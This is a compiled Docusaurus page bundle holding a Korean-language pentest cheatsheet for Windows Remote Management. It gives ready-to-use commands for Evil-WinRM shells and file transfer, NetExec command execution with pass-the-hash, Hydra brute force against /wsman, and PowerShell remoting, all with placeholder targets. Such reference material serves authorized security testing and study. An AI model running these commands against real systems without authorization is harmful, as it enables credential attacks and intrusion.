"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[324],{28453:(e,n,i)=>{i.d(n,{R:()=>t,x:()=>a});var s=i(96540);const r={},l=s.createContext(r);function t(e){const n=s.useContext(l);return s.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:t(e.components),s.createElement(l.Provider,{value:n},e.children)}},71738:(e,n,i)=>{i.r(n),i.d(n,{assets:()=>c,contentTitle:()=>a,default:()=>h,frontMatter:()=>t,metadata:()=>s,toc:()=>o});const s=JSON.parse('{"id":"cheatsheet/services/winrm","title":"WinRM - 5985/5986","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/cheatsheet/services/winrm.md","sourceDirName":"cheatsheet/services","slug":"/cheatsheet/services/winrm","permalink":"/my-docusaurus-page/cheatsheet/services/winrm","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":14,"frontMatter":{"sidebar_position":14},"sidebar":"tutorialSidebar","previous":{"title":"LDAP - 389/636","permalink":"/my-docusaurus-page/cheatsheet/services/ldap"},"next":{"title":"RPC - 111","permalink":"/my-docusaurus-page/cheatsheet/services/rpc"}}');var r=i(74848),l=i(28453);const t={sidebar_position:14},a="WinRM - 5985/5986",c={},o=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"Evil-WinRM",id:"evil-winrm",level:2},{value:"Evil-WinRM \ub0b4\ubd80 \uba85\ub839\uc5b4",id:"evil-winrm-\ub0b4\ubd80-\uba85\ub839\uc5b4",level:3},{value:"NetExec",id:"netexec",level:2},{value:"Nmap",id:"nmap",level:2},{value:"Hydra \ube0c\ub8e8\ud2b8\ud3ec\uc2a4",id:"hydra-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",level:2},{value:"PowerShell Remoting",id:"powershell-remoting",level:2},{value:"WinRM \ud65c\uc131\ud654 (\ub85c\uceec)",id:"winrm-\ud65c\uc131\ud654-\ub85c\uceec",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function d(e){const n={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"winrm---59855986",children:"WinRM - 5985/5986"})}),"\n",(0,r.jsx)(n.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,r.jsxs)(n.p,{children:[(0,r.jsx)(n.strong,{children:"\ud3ec\ud2b8"}),": 5985 (HTTP), 5986 (HTTPS)"]}),"\n",(0,r.jsx)(n.p,{children:"WinRM(Windows Remote Management)\uc740 Windows \uc2dc\uc2a4\ud15c\uc758 \uc6d0\uaca9 \uad00\ub9ac\ub97c \uc704\ud55c \ud504\ub85c\ud1a0\ucf5c\uc785\ub2c8\ub2e4."}),"\n",(0,r.jsx)(n.h2,{id:"evil-winrm",children:"Evil-WinRM"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# \uae30\ubcf8 \uc5f0\uacb0\nevil-winrm -i <RHOST> -u <USERNAME> -p <PASSWORD>\n\n# \uc778\uc99d\uc11c \uae30\ubc18 \uc5f0\uacb0\nevil-winrm -i <RHOST> -c /PATH/TO/CERTIFICATE/<CERTIFICATE>.crt -k /PATH/TO/PRIVATE/KEY/<KEY>.key -p -u -S\n"})}),"\n",(0,r.jsx)(n.h3,{id:"evil-winrm-\ub0b4\ubd80-\uba85\ub839\uc5b4",children:"Evil-WinRM \ub0b4\ubd80 \uba85\ub839\uc5b4"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# \ud30c\uc77c \uc5c5\ub85c\ub4dc\n*Evil-WinRM* PS> upload /path/to/local/file C:\\path\\to\\remote\\file\n\n# \ud30c\uc77c \ub2e4\uc6b4\ub85c\ub4dc\n*Evil-WinRM* PS> download C:\\path\\to\\remote\\file /path/to/local/file\n\n# PowerShell \uc2a4\ud06c\ub9bd\ud2b8 \ub85c\ub4dc\n*Evil-WinRM* PS> menu\n\n# \uc11c\ube44\uc2a4 \ubaa9\ub85d\n*Evil-WinRM* PS> services\n\n# \ud504\ub85c\uc138\uc2a4 \ubaa9\ub85d\n*Evil-WinRM* PS> processes\n"})}),"\n",(0,r.jsx)(n.h2,{id:"netexec",children:"NetExec"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# \uba85\ub839 \uc2e4\ud589\nnetexec winrm <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -X <COMMAND>\n\n# \ud574\uc2dc \uc0ac\uc6a9\nnetexec winrm <RHOST> -u '<USERNAME>' -H '<HASH>' -X <COMMAND>\n\n# \uc5ec\ub7ec \ud638\uc2a4\ud2b8 \uc2a4\uce94\nnetexec winrm <RHOST_RANGE> -u '<USERNAME>' -p '<PASSWORD>'\n"})}),"\n",(0,r.jsx)(n.h2,{id:"nmap",children:"Nmap"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:"# WinRM \ud3ec\ud2b8 \uc2a4\uce94\nsudo nmap -p5985,5986 -sV <RHOST>\n\n# WinRM \uc815\ubcf4 \uc218\uc9d1\nsudo nmap -p5985 --script http-methods <RHOST>\n"})}),"\n",(0,r.jsx)(n.h2,{id:"hydra-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",children:"Hydra \ube0c\ub8e8\ud2b8\ud3ec\uc2a4"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-bash",children:'# WinRM \ube0c\ub8e8\ud2b8\ud3ec\uc2a4\nhydra -L users.txt -P passwords.txt <RHOST> http-post -m "/wsman"\n'})}),"\n",(0,r.jsx)(n.h2,{id:"powershell-remoting",children:"PowerShell Remoting"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:"# PowerShell\uc5d0\uc11c WinRM \uc138\uc158 \uc0dd\uc131\n$password = ConvertTo-SecureString '<PASSWORD>' -AsPlainText -Force\n$cred = New-Object System.Management.Automation.PSCredential('<USERNAME>', $password)\nEnter-PSSession -ComputerName <RHOST> -Credential $cred\n\n# \uba85\ub839 \uc2e4\ud589\nInvoke-Command -ComputerName <RHOST> -Credential $cred -ScriptBlock { whoami }\n\n# \uc2a4\ud06c\ub9bd\ud2b8 \uc2e4\ud589\nInvoke-Command -ComputerName <RHOST> -Credential $cred -FilePath C:\\path\\to\\script.ps1\n"})}),"\n",(0,r.jsx)(n.h2,{id:"winrm-\ud65c\uc131\ud654-\ub85c\uceec",children:"WinRM \ud65c\uc131\ud654 (\ub85c\uceec)"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-powershell",children:'# WinRM \uc11c\ube44\uc2a4 \uc2dc\uc791\nEnable-PSRemoting -Force\n\n# \ubc29\ud654\ubcbd \uaddc\uce59 \ucd94\uac00\nSet-NetFirewallRule -Name "WINRM-HTTP-In-TCP" -RemoteAddress Any\n\n# TrustedHosts \uc124\uc815\nSet-Item WSMan:\\localhost\\Client\\TrustedHosts -Value "*" -Force\n\n# \uc124\uc815 \ud655\uc778\nwinrm get winrm/config\n'})}),"\n",(0,r.jsx)(n.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,r.jsxs)(n.ul,{children:["\n",(0,r.jsx)(n.li,{children:"WinRM \ud65c\uc131\ud654 \uc5ec\ubd80 \ud655\uc778"}),"\n",(0,r.jsx)(n.li,{children:"5985 (HTTP) vs 5986 (HTTPS)"}),"\n",(0,r.jsx)(n.li,{children:"Remote Server Administration \uadf8\ub8f9 \uba64\ubc84 \ud655\uc778"}),"\n",(0,r.jsx)(n.li,{children:"Pass-the-Hash \uac00\ub2a5"}),"\n",(0,r.jsx)(n.li,{children:"Evil-WinRM\uc73c\ub85c \uc258 \ud68d\ub4dd"}),"\n",(0,r.jsx)(n.li,{children:"PowerShell Remoting \uc0ac\uc6a9 \uac00\ub2a5"}),"\n"]})]})}function h(e={}){const{wrapper:n}={...(0,l.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}}}]);